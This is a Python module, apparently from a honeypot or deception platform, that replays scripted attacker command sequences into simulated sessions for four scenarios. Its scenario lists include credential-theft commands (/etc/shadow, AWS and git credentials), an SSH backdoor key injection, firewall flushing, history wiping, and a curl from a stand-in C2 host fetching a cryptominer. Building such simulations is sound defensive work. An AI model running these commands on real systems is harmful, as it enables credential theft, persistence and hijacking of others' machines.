import asyncio
import time
import uuid
from typing import List, Dict, Callable, Optional
from backend.core.session_manager import session_manager

SCENARIOS = {
    "recon_bot": {
        "name": "Automated Recon & Subnet Discovery",
        "actor": "Automated Scanner / Shodan Bot",
        "description": "Fast automated enumeration of OS kernel, network interfaces, and listening sockets.",
        "commands": [
            "whoami",
            "uname -a",
            "cat /etc/os-release",
            "id",
            "hostname",
            "ifconfig",
            "netstat -tlpn",
            "ps aux"
        ],
        "delay": 1.0
    },
    "credential_thief": {
        "name": "Targeted Cloud Credential & Secret Harvester",
        "actor": "Targeted Operator / Insider Threat",
        "description": "Systematic search for AWS keys, .env secrets, git tokens, and shadow hashes.",
        "commands": [
            "whoami",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "find / -name \".env\" 2>/dev/null",
            "cat /opt/api_gateway/.env",
            "cat ~/.aws/credentials",
            "cat ~/.git-credentials",
            "history"
        ],
        "delay": 1.2
    },
    "apt_privesc_persistence": {
        "name": "Full-Chain APT: Sudo Exploitation & SSH Backdoor",
        "actor": "Advanced Persistent Threat (APT-29 Sim)",
        "description": "SUID enumeration, sudo exploitation, root private key theft, SSH backdoor injection, and history scrub.",
        "commands": [
            "id",
            "sudo -l",
            "find / -perm -u=s 2>/dev/null",
            "cat /root/.ssh/id_rsa",
            "sudo -i",
            "whoami",
            "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8CanaryBackdoorKey== attacker@c2' >> /root/.ssh/authorized_keys",
            "iptables -F",
            "history -c"
        ],
        "delay": 1.4
    },
    "cryptojacker": {
        "name": "Malware Dropper & Cryptojacker Infiltration",
        "actor": "Ransomware / Cryptominer Botnet",
        "description": "Downloads remote payload into shell and launches CPU-intensive XMRig cryptocurrency miner.",
        "commands": [
            "lscpu",
            "curl -s http://evil-miner-c2.net/xmrig.tar.gz | tar -xz",
            "xmrig -o pool.minexmr.com:4444 -u 48edfHuPf417N8... -p worker1"
        ],
        "delay": 1.5
    }
}

class AttackSimulator:
    def __init__(self):
        self.active_simulations: Dict[str, asyncio.Task] = {}

    def get_available_scenarios(self) -> List[Dict]:
        return [
            {
                "id": k,
                "name": v["name"],
                "actor": v["actor"],
                "description": v["description"],
                "command_count": len(v["commands"])
            }
            for k, v in SCENARIOS.items()
        ]

    async def run_scenario(self, scenario_id: str, custom_session_id: Optional[str] = None) -> str:
        if scenario_id not in SCENARIOS:
            raise ValueError(f"Unknown scenario: {scenario_id}")

        scenario = SCENARIOS[scenario_id]
        session_id = custom_session_id or f"sim-{scenario_id}-{uuid.uuid4().hex[:5]}"
        
        # Determine fake IP based on scenario
        ip_map = {
            "recon_bot": "185.220.101.5",
            "credential_thief": "194.26.29.112",
            "apt_privesc_persistence": "45.154.255.89",
            "cryptojacker": "103.145.13.20"
        }
        remote_ip = ip_map.get(scenario_id, "198.51.100.42")

        session = session_manager.get_or_create_session(
            session_id=session_id,
            remote_ip=remote_ip,
            user_agent="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
        )

        async def _run_loop():
            for cmd in scenario["commands"]:
                await session_manager.execute_command(session.session_id, cmd)
                await asyncio.sleep(scenario.get("delay", 1.0))

        task = asyncio.create_task(_run_loop())
        self.active_simulations[session_id] = task
        return session_id

attack_simulator = AttackSimulator()
